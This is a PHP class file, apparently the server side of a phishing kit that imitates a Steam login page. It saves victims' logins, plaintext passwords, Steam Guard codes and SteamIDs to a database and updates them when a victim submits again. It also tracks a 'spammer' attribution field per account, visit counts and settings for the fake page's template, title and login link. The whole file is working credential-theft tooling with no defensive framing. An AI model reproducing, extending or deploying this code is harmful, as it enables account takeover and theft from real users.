<?php
require_once("classDB.php");

	class classFake {
		private $db;
		
		public function __construct(){
			$this->db = new DB();
		}
		
		public function b_CheckAccount($login, $pass, $guard){
			$res = $this->db->countRows("accounts", array("login" => $login, "password" => $pass, "guard" => $guard));
			return ($res > 0);
		}
		
		public function b_CheckLogin($login){
			$res = $this->db->countRows("accounts", array("login" => $login));
			return ($res > 0);
		}
		
		public function void_SetPassword($login, $password){
			$this->db->updateRow("accounts", "login", $login, array("password" => $password));
		}
		
		public function void_SetGuard($login, $guard){
			$this->db->updateRow("accounts", "login", $login, array("guard" => $guard));
		}
		
		public function void_SetTime($login){
			$this->db->updateRow("accounts", "login", $login, array("time" => time()));
		}
		
		public function void_AddAccount($login, $pass, $guard, $steamid, $spammer){
			if (self::b_CheckLogin($login)) {
				self::void_SetPassword($login, $pass);
				self::void_SetGuard($login, $guard);
				self::void_SetTime($login);
			}
			else {
				$values = array
				(
					"",							// id
					$login,						// login
					$pass,						// password
					$guard,						// guard
					$steamid,					// steamid
					time(),						// time
					0,							// status
					$spammer,					// spammer
					0							// isnotificated
				);
				$this->db->addRow("accounts", $values);
			}
		}
		
		public function int_GetFakeTemplate(){
			$rows = $this->db->getRows("settings", "name", "fake_template");
			return $rows[0]["value"];
		}
		
		public function s_GetFakeTitle(){
			$rows = $this->db->getRows("settings", "name", "title");
			return $rows[0]["value"];
		}
		
		public function s_GetLoginLink(){
			$rows = $this->db->getRows("settings", "name", "login_link");
			return $rows[0]["value"];
		}
		
		public function void_IncrementVisits(){
			$rows = $this->db->getRows("settings", "name", "visits");
			$visits = $rows[0]["value"];
			
			$this->db->updateRow("settings", "name", "visits", array("value" => $visits + 1));
		}
	}
?>